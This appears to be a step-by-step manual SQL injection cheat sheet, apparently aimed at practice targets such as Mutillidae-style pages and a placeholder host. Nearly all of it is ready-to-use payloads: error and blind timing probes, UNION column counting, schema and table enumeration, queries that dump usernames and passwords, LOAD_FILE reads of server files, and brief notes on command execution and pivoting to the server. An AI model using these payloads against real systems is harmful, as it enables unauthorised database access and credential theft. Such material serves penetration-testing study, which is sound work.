# SQL Injection Manually Step by Step

## 1. Determine if SQL injection exists

- Try injecting characters reserved in databases to produce error messages

```SQL
    single-quote
    back-slash
    double-hyphen
    forward-slash
    period
```

- If error message is produces, examine message for helpful errors, queries, database brand, columns, tables or other information.
- If no error message present, send valid data, "true" injections ("or 1=1") and "false" injections ("and 1=0"). Look for difference in the three responses

```SQL
  Technique: Blind SQL Injection - True and False Values
  Field: username
  True Value (Using Proxy): ' or 1=1 --
  False Value (Using Proxy): ' and 1=0 --
```

- If no errors nor differences are produced, try timing attacks ("mysql sleep(), sql server waitfor(), oracle sleep()")

```SQL
    ' union Select null, null, null, sleep(5) --
```

## 2. Determine injection types that work

- UNION statements
  - Determine number of columns in application query. Inject NULL columns until injected query works.
  - Determine position of a varchar or equivalent column
  - Use position of found column(s) to place injected columns. Use NULL for rest
- Inline injection
  - Usually happens when ORDER BY or HAVING clause present in application query
- Timing injection

```SQl
    Technique: Blind SQL Injection - Timing
    Page: login.php
    Field: username
    Value (Using Proxy): ' union Select null, case SUBSTRING(current_user(),1,1) when 'r' THEN sleep(5) ELSE sleep(0) END, null, null --
    Value (Using Direct Request): username=%27%20union%20Select%20null%2C%20case%20SUBSTRING%28current_user%28%29%2C1%2C1%29%20when%20%27r%27%20THEN%20sleep%285%29%20ELSE%20sleep%280%29%20END%2C%20null%2C%20null%20--%20&password=&login-php-submit-button=1
```

- Some useful payloads for Union Based SQL Injection

```SQL
' or 1=1#
1' ORDER BY 10#
1' UNION SELECT version(),2#
1' UNION SELECT version(),database()#
1' UNION SELECT version(),user()#
1' UNION ALL SELECT table_name,2 from information_schema.tables#
1' UNION ALL SELECT column_name,2 from information_schema.columns where table_name = "users"#
1' UNION ALL SELECT concat(user,char(58),password),2 from users#
```

## 3. Attempt to determine database server brand

```SQL
Technique: Direct Injection
Page: user-info.php
Field: username
Value (Using Proxy): ' union select null,VERSION() AS username,null,null --
```

## 4. Formulate and test query

## 5. Attempt to determine database name

```SQL
Technique: Direct Injection
Page: user-info.php
Field: username
Value (Using Proxy): ' union select null,DATABASE() AS username,null,null --
```

## 6. Attempt to determine schema name

```SQL
Technique: Direct Injection
Page: user-info.php
Field: username
Value (Using Proxy): ' union select null,table_schema AS username,null,null from INFORMATION_SCHEMA.TABLES--
```

|Database type | Query|
|-|-|
|Microsoft, MySQL | SELECT @@version|
|Oracle | SELECT * FROM v$version|
|PostgreSQL | SELECT version()|

For example, you could use a UNION attack with the following input:

```SQL
' UNION SELECT @@version--

'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
```

## 7. Attempt to determine table(s) names

```SQL
Technique: Direct Injection
Page: user-info.php
Field: username
Value (Using Proxy): ' union select null,table_schema AS username,table_name AS password,null from INFORMATION_SCHEMA.TABLES--
```

Most database types (with the notable exception of Oracle) have a set of views called the information schema which provide information about the database.

You can query information_schema.tables to list the tables in the database:

```SQL
SELECT * FROM information_schema.tables
```

This returns output like the following:

```Text
TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE
=====================================================
MyDatabase dbo Products BASE TABLE
MyDatabase dbo Users BASE TABLE
MyDatabase dbo Feedback BASE TABLE
```

This output indicates that there are three tables, called Products, Users, and Feedback.

You can then query information_schema.columns to list the columns in individual tables:

```SQL
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```

This returns output like the following:

```Text
TABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME DATA_TYPE
=================================================================
MyDatabase dbo Users UserId int
MyDatabase dbo Users Username varchar
MyDatabase dbo Users Password varchar
```

This output shows the columns in the specified table and the data type of each column.

### Equivalent to information schema on Oracle

On Oracle, you can obtain the same information with slightly different queries.

You can list tables by querying all_tables:

```SQL
SELECT * FROM all_tables
```

And you can list columns by querying all_tab_columns:

```SQL
SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
```

## 8. Attempt to determine column(s) names

```SQL
Technique: Direct Injection
Recon: Extract table columns from database using a single field
Page: user-info.php
Field: Username
Value: ' union select null,concat_ws('.', table_schema, table_name, column_name) AS username,null,null from INFORMATION_SCHEMA.COLUMNS--
```

## 8.1 Finding columns with a useful data type in an SQL injection UNION attack

First you need to know how many columns we have

The first method involves injecting a series of ORDER BY clauses and incrementing the specified column index until an error occurs. For example, assuming the injection point is a quoted string within the WHERE clause of the original query, you would submit:

```SQL
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

Another method involves submitting a series of UNION SELECT payloads specifying a different number of null values:

```SQL
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

The reason for performing an SQL injection UNION attack is to be able to retrieve the results from an injected query.
Generally, the interesting data that you want to retrieve will be in string form, so you need to find one or more columns in the original query results whose data type is, or is compatible with, string data.

Having already determined the number of required columns, you can probe each column to test whether it can hold string data by submitting a series of UNION SELECT payloads that place a string value into each column in turn. For example, if the query returns four columns, you would submit:

```SQL
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

If the data type of a column is not compatible with string data, the injected query will cause a database error, such as:

Conversion failed when converting the varchar value 'a' to data type int.

If an error does not occur, and the application's response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data.

### Notes

- On Oracle, every SELECT query must use the FROM keyword and specify a valid table. There is a built-in table on Oracle called DUAL which can be used for this purpose. So the injected queries on Oracle would need to look like: `' UNION SELECT NULL FROM DUAL--`.
- The payloads described use the double-dash comment sequence -- to comment out the remainder of the original query following the injection point. On MySQL, **the double-dash sequence must be followed by a space**. Alternatively, the hash character `#` can be used to identify a comment.

## 9. Attempt to extract data

```SQL
Technique: Direct Injection
Page: user-info.php
Field: Username
Value: ' union select null, owasp10.accounts.username AS username, owasp10.accounts.password AS password, null from owasp10.accounts --
```

## 9.1 Retrieving multiple values within a single column

In case of the the query only returns a single **column**

You can easily retrieve multiple values together within this single column by concatenating the values together, ideally including a suitable separator to let you distinguish the combined values. For example, on Oracle you could submit the input:

```SQL
' UNION SELECT username || '~' || password FROM users--
```

This uses the double-pipe sequence || which is a string concatenation operator on Oracle. The injected query concatenates together the values of the username and password fields, separated by the ~ character.

The results from the query will let you read all of the usernames and passwords, for example:

...
administrator~s3cure
wiener~peter
carlos~montoya
...

### String concatenation

You can concatenate together multiple strings to make a single string.
|-|-|
|-|-|
|Oracle |`'foo'||'bar'`|
|Microsoft | 'foo'+'bar'|
|PostgreSQL | 'foo'||'bar'|
|MySQL | 'foo' 'bar' [Note the space between the two strings] CONCAT('foo','bar')|

## 10. Attempt to read files from server

```SQL
Technique: Direct Injection
Page: user-info.php
Field: username
Value (relative path):
' union select null, LOAD_FILE('../README') AS username, null, null--

Value (absolute path):
' union select null, LOAD_FILE('..\\..\\..\\..\\WINDOWS\\system32\\drivers\\etc\\hosts') AS username, null, null--
' union select null, LOAD_FILE('..\\..\\..\\..\\WINDOWS\\inf\\cpu.inf') AS username, null, null--
```

## 11. Attempt to upload files to server

## 12. Attempt to execute commands. This is easier on SQL Server 2000 and 2005. MySQL has limited system command abilities. SQL Server 2008 disables system commands by default and requires them to be enabled.

## 13. Attempt to determine database computer name, IP address, username, version, etc.

```SQL
MySQL Functions:
VERSION() - MySQL server version
USER() - Database user issuing query
DATABASE() - Database on server against which query is running
```

## 14. Attempt to pivot to database server level. This will largely depend on either being able to execute system commands via the database server or upload files to the file system. Uploading files would allow web application pages to be uploaded which can contain system calls.

---

## Practical Steps for Manual SQLi

### Testing to get a database Error

```sql
> http://blabla.com?id=1\
> http://blabla.com?id=1'
```

### Sql comment to correct the error

```sql
# + is the encode of space
> http://blabla.com?id=1\--+
> http://blabla.com?id=1'#
```

## join queries

### To see how many columns used in this query

```sql
# 3 is our guess for used columns
> http://blabla.com?id=1' order by 3 --+
```

### Reading data from database

```sql
# We usually get the output for one query only,
# So we should get rid of the first query by searching for
# a non exist value like -1
> http://blabla.com?id=-1' union all select 1,2,3 --+
```

### Getting database name and version

```sql
> http://blabla.com?id=-1' union all select 1,database(),version() --+
```

### Getting table name

```sql
# database name = security
> http://blabla.com?id=-1' union all select 1,table_name,3 from information_schema.tables where table_schema='security' --+
```

### Getting all tables names

```sql
# database name = security
> http://blabla.com?id=-1' union all select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' --+
```

### Getting  table columns

```sql
> http://blabla.com?id=-1' union all select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+
```

### Dumping all table data

```sql
> http://blabla.com?id=-1' union all select 1,group_concat(username),group_concat(password) from users --+
```

### No quote injection

It is the same as with quote injection but using \ instead of ' for error detection and not using any thing in injection itself
